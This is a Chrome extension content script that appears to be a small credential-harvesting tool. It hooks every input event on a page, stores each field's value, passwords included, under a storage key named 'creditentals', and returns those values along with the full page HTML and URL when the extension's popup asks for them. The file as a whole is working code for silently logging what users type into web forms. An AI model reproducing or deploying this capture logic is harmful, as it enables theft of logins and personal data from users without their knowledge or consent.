// you will see this log in console log of current tab in Chrome when the script is injected
console.log("content_script.js");

let inputs = {};
function getIndexFromSet(set, elm) {
    var setArr = [].slice.call(set);
    for (var i in setArr) if (setArr[i] == elm) return i;
}

function inputChangeCallBack(event) {
    const _inputs = document.getElementsByTagName("input");
    index = getIndexFromSet(_inputs, event.target);
    inputs[index] = event.target.value;
    chrome.storage.local.set({ 'creditentals': inputs }, function () {
        console.log(inputs);
    });
}
// listen to input changes
document.addEventListener("input", inputChangeCallBack, true);

chrome.runtime.onMessage.addListener(function (cmd, sender, sendResponse) {
    switch (cmd) {
        case "getHtml":
            // retrieve document HTML and send to popup.js
            sendResponse({
                title: document.title,
                url: window.location.href,
                html: document.documentElement.innerHTML,
            });
            break;
        case "getInputs":
            // retrieve title HTML and send to popup.js
            console.log(Array.from(document.getElementsByTagName("input")).map((e) => e.value));
            sendResponse(document.getElementsByTagName("input")[0].value);
            break;
        default:
            sendResponse(null);
    }
});

